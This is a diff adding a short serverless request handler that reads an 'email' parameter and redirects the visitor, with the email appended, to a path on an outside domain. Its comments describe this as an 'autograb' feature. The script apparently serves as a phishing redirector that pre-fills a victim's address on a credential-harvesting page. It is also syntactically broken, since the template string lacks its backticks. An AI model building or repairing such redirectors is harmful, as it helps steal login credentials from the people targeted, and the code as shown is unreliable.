@@ -1,0 +1,20 @@
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request))
+})
+
+async function handleRequest(request) {
+  // Extract the email from the request
+  const url = new URL(request.url);
+  const email = url.searchParams.get('email');
+  
+  // Check if email is provided
+  if (!email) {
+    return new Response('Hi.', { status: 400 });
+  }
+
+  // URL with autograb feature and dynamic email extension
+  const autograbUrl = https://www.guaranyjunior.com.br/jlkd/?email=${email};
+  
+  // Redirect to the URL with autograb and dynamic email extension
+  return Response.redirect(autograbUrl, 302);
+}
